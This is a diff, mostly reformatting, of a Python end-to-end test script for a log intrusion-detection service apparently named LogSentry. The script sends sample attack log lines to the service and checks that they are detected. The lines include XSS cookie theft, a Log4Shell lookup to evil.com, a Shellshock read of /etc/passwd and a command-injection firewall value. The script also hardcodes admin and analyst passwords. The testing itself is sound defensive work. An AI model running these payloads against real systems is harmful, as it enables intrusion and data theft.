@@ -17,13 +17,11 @@ Tests ALL detection layers end-to-end via the live FastAPI server:
  10. Threat Intelligence
 """
 
-import json
 import sys
-import time
 
 # Fix Windows console encoding
 try:
-    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
+    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
 except Exception:
     pass
 
@@ -31,6 +29,7 @@ import httpx
 
 API_BASE = "http://127.0.0.1:8000"
 TIMEOUT = 10.0
+
 
 # --- ANSI Colors ---
 class C:
@@ -43,6 +42,7 @@ class C:
     BOLD = "\033[1m"
     DIM = "\033[2m"
     RESET = "\033[0m"
+
 
 passed = 0
 failed = 0
@@ -104,8 +104,11 @@ def main():
         health = r.json()
         check("Server is online", r.status_code == 200)
         check("Health status is 'ok'", health.get("status") == "ok")
-        check("Signature engine loaded", health.get("signature_count", 0) > 0,
-              f"Loaded {health.get('signature_count', 0)} signatures")
+        check(
+            "Signature engine loaded",
+            health.get("signature_count", 0) > 0,
+            f"Loaded {health.get('signature_count', 0)} signatures",
+        )
         info(f"AI Ready: {health.get('ai_ready')} | Brains: {health.get('active_brains', [])}")
         ai_ready = health.get("ai_ready", False)
     except httpx.ConnectError:
@@ -127,10 +130,9 @@ def main():
     check("Wrong password returns 401", r.status_code == 401)
 
     # 1c. Login as ADMIN
-    r = client.post("/api/auth/login", json={
-        "username": "admin",
-        "password": "LogSentry@Admin2026!"
-    })
+    r = client.post(
+        "/api/auth/login", json={"username": "admin", "password": "LogSentry@Admin2026!"}
+    )
     check("Admin login succeeds", r.status_code == 200)
     admin_token = r.json().get("token", "")
     admin_role = r.json().get("role", "")
@@ -138,10 +140,9 @@ def main():
     admin_headers = {"Authorization": f"Bearer {admin_token}"}
 
     # 1d. Login as ANALYST
-    r = client.post("/api/auth/login", json={
-        "username": "analyst",
-        "password": "LogSentry@Analyst2026!"
-    })
+    r = client.post(
+        "/api/auth/login", json={"username": "analyst", "password": "LogSentry@Analyst2026!"}
+    )
     check("Analyst login succeeds", r.status_code == 200)
     analyst_token = r.json().get("token", "")
     analyst_role = r.json().get("role", "")
@@ -164,10 +165,7 @@ def main():
     rate_limit_user = "ratelimituser"
     rate_limited = False
     for i in range(6):
-        r = client.post("/api/auth/login", json={
-            "username": rate_limit_user,
-            "password": "bad"
-        })
+        r = client.post("/api/auth/login", json={"username": rate_limit_user, "password": "bad"})
         if r.status_code == 429:
             rate_limited = True
             break
@@ -192,12 +190,12 @@ def main():
         },
         {
             "name": "XSS (Script Tag)",
-            "payload": '203.0.113.5 - GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1',
+            "payload": "203.0.113.5 - GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1",
             "expected_type": "XSS",
         },
         {
             "name": "XSS (Event Handler)",
-            "payload": '203.0.113.6 - GET /page?img=x onerror=alert(1) HTTP/1.1',
+            "payload": "203.0.113.6 - GET /page?img=x onerror=alert(1) HTTP/1.1",
             "expected_type": "XSS",
         },
         {
@@ -237,12 +235,12 @@ def main():
         },
         {
             "name": "Log4Shell Exploit",
-            "payload": '88.99.44.55 - GET /api?token=${jndi:ldap://evil.com/exploit} HTTP/1.1',
+            "payload": "88.99.44.55 - GET /api?token=${jndi:ldap://evil.com/exploit} HTTP/1.1",
             "expected_type": "Log4Shell",
         },
         {
             "name": "Shellshock Vulnerability",
-            "payload": '88.99.44.56 - GET /cgi-bin/test.cgi HTTP/1.1 () { :; }; /bin/cat /etc/passwd',
+            "payload": "88.99.44.56 - GET /cgi-bin/test.cgi HTTP/1.1 () { :; }; /bin/cat /etc/passwd",
             "expected_type": "Shellshock",
         },
         {
@@ -321,8 +319,11 @@ def main():
             sig_detected += 1
             alert = alerts[0]
             type_match = attack["expected_type"].lower() in alert.get("Type", "").lower()
-            check(f"Detected as '{alert.get('Type')}'", type_match,
-                  f"Expected substring: '{attack['expected_type']}'")
+            check(
+                f"Detected as '{alert.get('Type')}'",
+                type_match,
+                f"Expected substring: '{attack['expected_type']}'",
+            )
 
             # Check AI Triage Report
             ai_report = alert.get("ai_report")
@@ -335,16 +336,18 @@ def main():
             )
             if has_triage:
                 sig_triage += 1
-            check(f"AI Triage report attached", has_triage)
+            check("AI Triage report attached", has_triage)
             if has_triage:
                 info(f"Agent Mode: {ai_report.get('agent_mode', 'N/A')}")
                 info(f"Analysis: {ai_report['analysis'][:100]}...")
                 info(f"Mitigations: {len(ai_report['mitigations'])} steps")
         else:
-            check(f"Detected attack", False, f"No alerts returned for: {attack['name']}")
+            check("Detected attack", False, f"No alerts returned for: {attack['name']}")
 
-    print(f"\n  {C.BOLD}Signature Summary: {sig_detected}/{len(signature_attacks)} attacks detected, "
-          f"{sig_triage}/{sig_detected} triage reports attached{C.RESET}")
+    print(
+        f"\n  {C.BOLD}Signature Summary: {sig_detected}/{len(signature_attacks)} attacks detected, "
+        f"{sig_triage}/{sig_detected} triage reports attached{C.RESET}"
+    )
 
     # ----------------------------------------------------------
     # PHASE 4: AI Multi-Brain Detection
@@ -402,9 +405,11 @@ def main():
                     if isinstance(ai_report, dict):
                         info(f"Triage: {ai_report.get('analysis', '')[:90]}...")
             else:
-                check(f"AI brain detected attack", False, f"No alerts for {attack['name']}")
+                check("AI brain detected attack", False, f"No alerts for {attack['name']}")
 
-        print(f"\n  {C.BOLD}AI Brain Summary: {ai_detected}/{len(ai_attacks)} attack patterns detected{C.RESET}")
+        print(
+            f"\n  {C.BOLD}AI Brain Summary: {ai_detected}/{len(ai_attacks)} attack patterns detected{C.RESET}"
+        )
 
     # ----------------------------------------------------------
     # PHASE 5: IP Reputation & Auto-Blocking
@@ -417,9 +422,11 @@ def main():
     check("Blocked IPs endpoint returns list", isinstance(blocked_list, list))
 
     blocked_ips = [entry["ip"] for entry in blocked_list]
-    check("SQL Injection attacker 45.33.22.11 auto-blocked",
-          "45.33.22.11" in blocked_ips,
-          f"Blocked IPs: {blocked_ips[:10]}")
+    check(
+        "SQL Injection attacker 45.33.22.11 auto-blocked",
+        "45.33.22.11" in blocked_ips,
+        f"Blocked IPs: {blocked_ips[:10]}",
+    )
 
     info(f"Total blocked IPs: {len(blocked_ips)}")
     for entry in blocked_list[:5]:
@@ -432,19 +439,26 @@ def main():
 
     # Send a benign log from a blocked IP -- should be intercepted
     blocked_ip = "45.33.22.11"
-    r = client.post("/api/logs", json={
-        "line": f"{blocked_ip} - GET /totally-normal-page HTTP/1.1 200"
-    }, headers=admin_headers)
+    r = client.post(
+        "/api/logs",
+        json={"line": f"{blocked_ip} - GET /totally-normal-page HTTP/1.1 200"},
+        headers=admin_headers,
+    )
     data = r.json()
     alerts = data.get("alerts", [])
 
     if alerts:
         alert_type = alerts[0].get("Type", "")
-        check("Blocked IP intercepted by IPS gate",
-              "Blocked" in alert_type or "IPS" in alert_type,
-              f"Alert type: {alert_type}")
-        check("IPS suppressed signature/AI checks",
-              "Suppressed" in alerts[0].get("Details", "") or "blocked" in alerts[0].get("Details", "").lower())
+        check(
+            "Blocked IP intercepted by IPS gate",
+            "Blocked" in alert_type or "IPS" in alert_type,
+            f"Alert type: {alert_type}",
+        )
+        check(
+            "IPS suppressed signature/AI checks",
+            "Suppressed" in alerts[0].get("Details", "")
+            or "blocked" in alerts[0].get("Details", "").lower(),
+        )
     else:
         check("IPS gate intercepted blocked IP traffic", False, "No alerts returned")
 
@@ -456,7 +470,9 @@ def main():
     r = client.get("/api/threat-intel", headers=admin_headers)
     check("Threat intel endpoint returns data", r.status_code == 200)
     reputations = r.json()
-    check("Reputation records exist", len(reputations) > 0, f"Total IPs tracked: {len(reputations)}")
+    check(
+        "Reputation records exist", len(reputations) > 0, f"Total IPs tracked: {len(reputations)}"
+    )
 
     # Show top 5 threat scores
     for rep in reputations[:5]:
@@ -475,14 +491,12 @@ def main():
     # 8b. Admin can unblock
     r = client.post("/api/ips/unblock", json={"ip": blocked_ip}, headers=admin_headers)
     check("Admin unblocks IP successfully", r.status_code == 200)
-    check("Unblock response confirms IP",
-          blocked_ip in r.json().get("message", ""))
+    check("Unblock response confirms IP", blocked_ip in r.json().get("message", ""))
 
     # 8c. Verify IP is no longer in blocked list
     r = client.get("/api/blocked-ips", headers=admin_headers)
     blocked_after = [entry["ip"] for entry in r.json()]
-    check(f"IP {blocked_ip} removed from blocked list",
-          blocked_ip not in blocked_after)
+    check(f"IP {blocked_ip} removed from blocked list", blocked_ip not in blocked_after)
 
     # ----------------------------------------------------------
     # PHASE 9: Firewall IP Validation (Injection Prevention)
@@ -495,8 +509,11 @@ def main():
 
     # 9b. Command injection attempt should be rejected with 400
     r = client.post("/api/ips/deploy-firewall", json={"ip": "1.2.3.4;rm -"}, headers=admin_headers)
-    check("Command injection payload rejected (400)", r.status_code in [400, 422],
-          f"Status: {r.status_code}, Body: {r.text[:100]}")
+    check(
+        "Command injection payload rejected (400)",
+        r.status_code in [400, 422],
+        f"Status: {r.status_code}, Body: {r.text[:100]}",
+    )
 
     # ----------------------------------------------------------
     # PHASE 10: Model Analytics
@@ -563,10 +580,14 @@ def main():
     r = client.post("/api/logs/batch", json={"lines": batch_lines}, headers=admin_headers)
     check("Batch ingestion succeeds", r.status_code == 200)
     batch_data = r.json()
-    check(f"Batch processed {batch_data.get('line_count', 0)} lines",
-          batch_data.get("line_count") == len(batch_lines))
-    check(f"Batch detected {batch_data.get('alert_count', 0)} alerts",
-          batch_data.get("alert_count", 0) >= 2)
+    check(
+        f"Batch processed {batch_data.get('line_count', 0)} lines",
+        batch_data.get("line_count") == len(batch_lines),
+    )
+    check(
+        f"Batch detected {batch_data.get('alert_count', 0)} alerts",
+        batch_data.get("alert_count", 0) >= 2,
+    )
 
     # ----------------------------------------------------------
     # PHASE 13: Session Logout
@@ -595,9 +616,13 @@ def main():
     print()
 
     if failed == 0:
-        print(f"  {C.GREEN}{C.BOLD}* ALL TESTS PASSED -- LogSentry detection pipeline fully operational *{C.RESET}")
+        print(
+            f"  {C.GREEN}{C.BOLD}* ALL TESTS PASSED -- LogSentry detection pipeline fully operational *{C.RESET}"
+        )
     else:
-        print(f"  {C.YELLOW}{C.BOLD}! {failed} test(s) failed -- review output above for details{C.RESET}")
+        print(
+            f"  {C.YELLOW}{C.BOLD}! {failed} test(s) failed -- review output above for details{C.RESET}"
+        )
 
     print()
     client.close()
